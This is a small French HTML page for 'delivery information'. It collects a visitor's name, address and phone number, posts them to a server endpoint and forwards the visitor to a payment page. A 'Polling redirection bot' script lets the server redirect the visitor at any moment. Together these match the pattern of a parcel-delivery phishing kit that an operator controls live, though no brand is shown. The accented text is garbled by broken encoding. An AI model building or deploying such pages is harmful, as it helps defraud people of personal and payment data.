<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Livraison</title>
</head>
<body>
<h1>ðŸ“¦ Informations Livraison</h1>
<form id="deliveryForm">
<input type="text" name="nom" placeholder="Nom" required>
<input type="text" name="prenom" placeholder="PrÃ©nom" required>
<input type="text" name="adresse" placeholder="Adresse" required>
<input type="text" name="telephone" placeholder="TÃ©lÃ©phone" required>
<button type="submit">Continuer vers Paiement</button>
</form>

<script>
document.getElementById('deliveryForm').addEventListener('submit', async (e)=>{
    e.preventDefault();
    const form = e.target;
    const data = {
        nom: form.nom.value,
        prenom: form.prenom.value,
        adresse: form.adresse.value,
        telephone: form.telephone.value
    };
    await fetch('/api/delivery',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
    window.location.href='/payment.html';
});

// Polling redirection bot
async function pollRedirect(){
    const res = await fetch('/api/status');
    const data = await res.json();
    if(data.redirect && window.location.pathname !== data.redirect){
        window.location.href = data.redirect;
    }
    setTimeout(pollRedirect,1000);
}
pollRedirect();
</script>
</body>
</html>
